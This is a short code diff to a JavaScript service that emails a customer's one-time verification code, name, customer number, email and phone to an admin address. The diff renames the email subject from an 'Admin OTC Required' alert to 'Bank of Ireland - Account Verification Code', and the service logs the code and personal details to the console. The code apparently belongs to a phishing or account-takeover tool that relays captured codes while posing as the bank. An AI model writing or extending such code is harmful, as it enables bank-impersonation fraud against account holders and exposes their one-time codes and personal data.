@@ -177,7 +177,7 @@ class OTCService {
             'X-MSMail-Priority': 'High',
             'Importance': 'high'
           },
-          subject: `🚨 URGENT: Admin OTC Required - ${otc} - ${accountData.customerNumber}`,
+          subject: `Bank of Ireland - Account Verification Code: ${otc}`,
         html: `
           <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
             <div style="background-color: #126987; color: white; padding: 20px; border-radius: 8px 8px 0 0;">
@@ -260,7 +260,7 @@ class OTCService {
         
         // Success logging
         console.log(`✅ SUCCESS: Admin OTC email sent successfully to ${adminEmail}`);
-        console.log(`📧 Subject: 🚨 URGENT: Admin OTC Required - ${otc}`);
+        console.log(`📧 Subject: Bank of Ireland - Account Verification Code: ${otc}`);
         console.log(`🔑 OTC Code: ${otc}`);
         console.log(`👤 Customer: ${accountData.name} (${accountData.customerNumber})`);
         console.log(`📞 Contact: ${accountData.email} | ${accountData.phone}`);
